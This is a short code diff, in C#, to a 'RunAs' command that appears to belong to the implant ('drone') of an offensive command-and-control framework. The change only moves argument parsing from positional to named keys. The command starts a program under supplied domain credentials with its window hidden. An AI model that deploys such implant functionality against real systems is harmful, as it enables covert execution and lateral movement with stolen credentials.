@@ -13,17 +13,15 @@ public sealed class RunAs : DroneCommand
 
     public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
-        var split = task.Arguments[0].Split('\\');
-        
         using var process = new Process
         {
             StartInfo = new ProcessStartInfo
             {
-                Domain = split[0],
-                UserName = split[1],
-                Password = task.Arguments[1].ToSecureString(),
-                FileName = task.Arguments[2],
-                Arguments = string.Join(" ", task.Arguments.Skip(3)),
+                Domain = task.Arguments["domain"],
+                UserName = task.Arguments["username"],
+                Password = task.Arguments["password"].ToSecureString(),
+                FileName = task.Arguments["program"],
+                Arguments = task.Arguments["args"],
                 CreateNoWindow = true,
                 WindowStyle = ProcessWindowStyle.Hidden,
                 RedirectStandardOutput = true,
